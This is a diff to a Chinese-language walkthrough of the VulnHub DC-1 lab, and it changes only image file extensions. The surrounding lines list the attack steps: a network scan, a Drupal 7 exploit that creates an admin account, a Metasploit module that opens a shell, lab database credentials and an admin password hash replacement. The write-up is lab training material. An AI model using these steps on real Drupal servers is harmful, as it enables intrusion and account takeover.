@@ -29,7 +29,7 @@ IP不知、账户密码不知、最终获取到root权限（cd /root  cat /etc/s
 
   - @  sudo nmap -sP 192.168.133.0/24
 
-![VulnHub DC-1 靶机实战 示意图 1](/images/linux-notes/vulnhub-dc-1/img-01.png)
+![VulnHub DC-1 靶机实战 示意图 1](/images/linux-notes/vulnhub-dc-1/img-01.webp)
 
   - @ 全面扫描指定IP
 
@@ -37,7 +37,7 @@ IP不知、账户密码不知、最终获取到root权限（cd /root  cat /etc/s
 
   - (一定不能扫描公网IP，生成大量的请求数据，IDS)
 
-![VulnHub DC-1 靶机实战 示意图 2](/images/linux-notes/vulnhub-dc-1/img-02.png)
+![VulnHub DC-1 靶机实战 示意图 2](/images/linux-notes/vulnhub-dc-1/img-02.webp)
 
   - @  apache 2.2.22      web服务
 
@@ -59,19 +59,19 @@ IP不知、账户密码不知、最终获取到root权限（cd /root  cat /etc/s
 
   - ！drupal 7
 
-![VulnHub DC-1 靶机实战 示意图 3](/images/linux-notes/vulnhub-dc-1/img-03.png)
+![VulnHub DC-1 靶机实战 示意图 3](/images/linux-notes/vulnhub-dc-1/img-03.webp)
 
   - @searchsploit -m 34992
 
-![VulnHub DC-1 靶机实战 示意图 4](/images/linux-notes/vulnhub-dc-1/img-04.png)
+![VulnHub DC-1 靶机实战 示意图 4](/images/linux-notes/vulnhub-dc-1/img-04.webp)
 
-![VulnHub DC-1 靶机实战 示意图 5](/images/linux-notes/vulnhub-dc-1/img-05.png)
+![VulnHub DC-1 靶机实战 示意图 5](/images/linux-notes/vulnhub-dc-1/img-05.webp)
 
   - ！尝试创建管理员账号
 
   - python2 34992.py -t http://192.168.133.134 -u tom -p 123456
 
-![VulnHub DC-1 靶机实战 示意图 6](/images/linux-notes/vulnhub-dc-1/img-06.png)
+![VulnHub DC-1 靶机实战 示意图 6](/images/linux-notes/vulnhub-dc-1/img-06.webp)
 
 暂停~ 获取系统权限！方法一：
 
@@ -83,17 +83,17 @@ IP不知、账户密码不知、最终获取到root权限（cd /root  cat /etc/s
 
   - @msfconsole
 
-![VulnHub DC-1 靶机实战 示意图 7](/images/linux-notes/vulnhub-dc-1/img-07.png)
+![VulnHub DC-1 靶机实战 示意图 7](/images/linux-notes/vulnhub-dc-1/img-07.webp)
 
   - @msf > search drupal 7
 
-![VulnHub DC-1 靶机实战 示意图 8](/images/linux-notes/vulnhub-dc-1/img-08.png)
+![VulnHub DC-1 靶机实战 示意图 8](/images/linux-notes/vulnhub-dc-1/img-08.webp)
 
   - @use 1  （选择模块）
 
   - @show options (查看模块配置)
 
-![VulnHub DC-1 靶机实战 示意图 9](/images/linux-notes/vulnhub-dc-1/img-09.png)
+![VulnHub DC-1 靶机实战 示意图 9](/images/linux-notes/vulnhub-dc-1/img-09.webp)
 
   - @run 开始攻击
 
@@ -109,17 +109,17 @@ meterpreter >   平台的shell
 
   - @/var/www/sites/default$ cat settings.php
 
-![VulnHub DC-1 靶机实战 示意图 10](/images/linux-notes/vulnhub-dc-1/img-10.png)
+![VulnHub DC-1 靶机实战 示意图 10](/images/linux-notes/vulnhub-dc-1/img-10.webp)
 
   - ！登录数据库
 
   - mysql -u dbuser -pR0ck3t
 
-![VulnHub DC-1 靶机实战 示意图 11](/images/linux-notes/vulnhub-dc-1/img-11.png)
+![VulnHub DC-1 靶机实战 示意图 11](/images/linux-notes/vulnhub-dc-1/img-11.webp)
 
   - @查找drupal自带的密码生成脚本
 
-![VulnHub DC-1 靶机实战 示意图 12](/images/linux-notes/vulnhub-dc-1/img-12.png)
+![VulnHub DC-1 靶机实战 示意图 12](/images/linux-notes/vulnhub-dc-1/img-12.webp)
 
   - hash: $S$DL74aPmGjcBH8wH/tThUeD2guiePqM/6Xb8NkjzdJ4/AurGkqsmx@替换admin的密码
 
